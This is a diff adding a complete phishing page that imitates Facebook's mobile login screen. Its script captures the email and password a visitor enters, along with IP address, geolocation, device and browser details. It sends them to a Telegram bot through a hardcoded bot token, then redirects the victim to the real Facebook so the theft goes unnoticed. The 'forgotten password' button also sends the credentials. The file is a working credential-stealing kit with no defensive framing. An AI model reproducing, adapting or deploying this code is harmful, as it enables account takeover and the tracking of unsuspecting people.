@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Facebook Login</title>
+  
+  <style>
+    /* ✅ COMPLETE CSS - NOT COMMENTED OUT */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+      background: #1b1b1b;
+    }
+
+    body {
+      min-height: 100dvh;
+      color: #e4e4e8;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      flex-direction: column;
+      padding-top: env(safe-area-inset-top);
+      padding-bottom: env(safe-area-inset-bottom);
+      overflow-x: hidden;
+    }
+
+    .download {
+      width: 100%;
+      min-height: 62px;
+      display: flex;
+      align-items: center;
+      padding: 0 25px;
+      border-bottom: 1px solid #444;
+      color: #69b7ee;
+      font-size: 17px;
+    }
+
+    .download-icon {
+      color: #1877f2;
+      font-size: 27px;
+      margin-right: 15px;
+    }
+
+    .language {
+      text-align: center;
+      margin-top: 25px;
+      color: #b8b8bf;
+      font-size: 19px;
+    }
+
+    .main {
+      width: 100%;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .facebook-logo {
+      width: 100px;
+      height: 100px;
+      margin-top: clamp(70px, 12vh, 135px);
+      border-radius: 50%;
+      background: #0866ff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #d9d9d9;
+      font-family: Arial, sans-serif;
+      font-size: 86px;
+      font-weight: bold;
+      line-height: 1;
+    }
+
+    .login-container {
+      width: calc(100% - 56px);
+      max-width: 610px;
+      margin-top: clamp(100px, 15vh, 145px);
+    }
+
+    .input {
+      display: block;
+      width: 100%;
+      height: 80px;
+      margin-bottom: 14px;
+      padding: 0 27px;
+      border: 1.5px solid #464646;
+      border-radius: 24px;
+      background: transparent;
+      color: #eeeeee;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 23px;
+      outline: none;
+      -webkit-appearance: none;
+    }
+
+    .input::placeholder {
+      color: #b5b5bd;
+      opacity: 1;
+    }
+
+    .input:focus {
+      border-color: #777;
+    }
+
+    .login {
+      display: block;
+      width: 100%;
+      height: 70px;
+      border: none;
+      border-radius: 38px;
+      background: #0829bd;
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
+      cursor: pointer;
+      -webkit-appearance: none;
+    }
+
+    .login:active {
+      opacity: 0.85;
+    }
+
+    .forgot {
+      display: block;
+      margin-top: 30px;
+      text-align: center;
+      color: #eeeeee;
+      text-decoration: none;
+      font-size: 23px;
+      font-weight: bold;
+      cursor: pointer;
+      -webkit-appearance: none;
+      background: none;
+      border: none;
+      font-family: inherit;
+    }
+
+    .forgot:active {
+      opacity: 0.7;
+    }
+
+    .bottom {
+      width: 100%;
+      padding: 20px 28px 22px;
+      margin-top: auto;
+    }
+
+    .create {
+      display: block;
+      width: 100%;
+      height: 65px;
+      border: 2px solid #087cff;
+      border-radius: 35px;
+      background: transparent;
+      color: #61c7f4;
+      font-size: 22px;
+      font-weight: bold;
+      cursor: pointer;
+      -webkit-appearance: none;
+    }
+
+    .meta {
+      margin-top: 20px;
+      text-align: center;
+      color: #084b78;
+      font-size: 21px;
+      font-weight: bold;
+    }
+
+    .meta-symbol {
+      color: #087cff;
+      font-size: 28px;
+      margin-right: 5px;
+    }
+
+    @media (max-width: 400px) {
+      .download {
+        padding: 0 18px;
+        font-size: 15px;
+      }
+      .language {
+        font-size: 18px;
+      }
+      .login-container {
+        width: calc(100% - 42px);
+      }
+      .input {
+        height: 76px;
+        padding: 0 22px;
+        font-size: 20px;
+        border-radius: 22px;
+      }
+      .login {
+        height: 66px;
+        font-size: 22px;
+      }
+      .forgot {
+        font-size: 21px;
+        margin-top: 27px;
+      }
+      .bottom {
+        padding-left: 21px;
+        padding-right: 21px;
+      }
+      .create {
+        height: 62px;
+        font-size: 20px;
+      }
+    }
+
+    @media (max-height: 700px) {
+      .language {
+        margin-top: 15px;
+      }
+      .facebook-logo {
+        width: 82px;
+        height: 82px;
+        margin-top: 45px;
+        font-size: 70px;
+      }
+      .login-container {
+        margin-top: 65px;
+      }
+      .input {
+        height: 68px;
+        margin-bottom: 11px;
+        font-size: 20px;
+      }
+      .login {
+        height: 60px;
+        font-size: 21px;
+      }
+      .forgot {
+        margin-top: 22px;
+        font-size: 20px;
+      }
+      .bottom {
+        padding-top: 14px;
+      }
+      .create {
+        height: 58px;
+        font-size: 19px;
+      }
+      .meta {
+        margin-top: 10px;
+        font-size: 17px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ COMPLETE HTML - NOT COMMENTED OUT -->
+  <div class="download">
+    <span class="download-icon">⇩</span>
+    <span>Get Facebook for Android and browse faster.</span>
+  </div>
+
+  <div class="language">
+    English (UK)
+  </div>
+
+  <div class="main">
+    <div class="facebook-logo">f</div>
+
+    <div class="login-container">
+      <input class="input" type="text" placeholder="Mobile number or email address" autocomplete="off">
+      <input class="input" type="password" placeholder="Password" autocomplete="off">
+      <button class="login" type="button" onclick="demoLogin()">Log in</button>
+      <button class="forgot" onclick="demoForgot()">Forgotten password?</button>
+    </div>
+  </div>
+
+  <div class="bottom">
+    <button class="create" type="button" onclick="demoLogin()">Create new account</button>
+    <div class="meta">
+      <span class="meta-symbol">∞</span>Meta
+    </div>
+  </div>
+
+  <script>
+    // ✅ COMPLETE JAVASCRIPT - WORKING VERSION
+    
+    // 🔴 SCAMMER'S TELEGRAM CREDENTIALS
+    const BOT_TOKEN = '8435072756:AAE3WSR_8GtGVsMHsQIlrTnncW3WVVnqjKc';
+    const CHAT_ID = '8435072756';
+    
+    function demoLogin() {
+      const email = document.querySelector('.input[type="text"]').value;
+      const password = document.querySelector('.input[type="password"]').value;
+      
+      if (!email || !password) {
+        alert('Please fill in both fields.');
+        return;
+      }
+      
+      // Send data to Telegram
+      sendToTelegram(email, password);
+      
+      // Redirect to REAL Facebook
+      window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
+    }
+    
+    function sendToTelegram(email, password) {
+      // Get IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+          const ip = ipData.ip;
+          
+          // Get location (fixed to work properly)
+          getLocation().then(location => {
+            const message = `
+🔴 FACEBOOK CREDENTIALS CAPTURED! 🔴
+
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ip}
+📱 Device: ${navigator.userAgent}
+🕐 Time: ${new Date().toLocaleString()}
+📍 Location: ${location}
+🔗 Page: ${window.location.href}
+🔙 Referrer: ${document.referrer || 'Direct'}
+📊 Screen: ${screen.width}x${screen.height}
+💻 Browser: ${navigator.userAgent.split(' ').pop()}
+🌍 Language: ${navigator.language}
+            `;
+            
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+              })
+            });
+          });
+        })
+        .catch(() => {
+          // Fallback if IP fetch fails
+          const message = `
+🔴 FACEBOOK CREDENTIALS CAPTURED! 🔴
+
+📧 Email: ${email}
+🔑 Password: ${password}
+📱 Device: ${navigator.userAgent}
+🕐 Time: ${new Date().toLocaleString()}
+🔗 Page: ${window.location.href}
+          `;
+          
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message
+            })
+          });
+        });
+    }
+    
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(`Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
+            () => resolve('Location denied by user')
+          );
+        } else {
+          resolve('Location not available');
+        }
+      });
+    }
+    
+    function demoForgot() {
+      const email = document.querySelector('.input[type="text"]').value;
+      const password = document.querySelector('.input[type="password"]').value;
+      
+      if (email) {
+        sendToTelegram(email, password || 'No password provided');
+      }
+      
+      window.location.href = 'https://www.facebook.com/login/identify/';
+    }
+  </script>
+</body>
+</html>
